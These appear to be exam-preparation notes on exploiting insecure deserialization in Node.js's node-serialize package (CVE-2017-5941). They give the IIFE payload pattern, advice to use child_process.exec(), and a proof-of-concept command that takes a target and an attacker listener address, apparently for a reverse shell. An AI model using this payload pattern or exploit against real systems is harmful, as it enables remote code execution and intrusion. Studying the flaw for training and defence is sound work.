# Node.js Deserialization RCE PoC Notes

## Vulnerability Summary
- **Target**: Node.js applications using node-serialize
- **CVE**: CVE-2017-5941
- **Type**: Insecure deserialization → RCE
- **Impact**: Remote code execution

## Key Concepts
node-serialize uses special wrapper `_$$ND_FUNC$$_` to serialize functions. Attackers can craft IIFE (Immediately Invoked Function Expression) to execute code during deserialization.

## Quick Usage
```bash
python3 poc.py 192.168.1.10 3000 10.10.14.5 4444
```

## OSWE Exam Tips
- Look for `node-serialize` or `serialize` in package.json
- Check cookies and session data for serialized objects
- IIFE pattern: `_$$ND_FUNC$$_function(){CODE}()`
- Use child_process.exec() for command execution

## References
- Original advisory: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
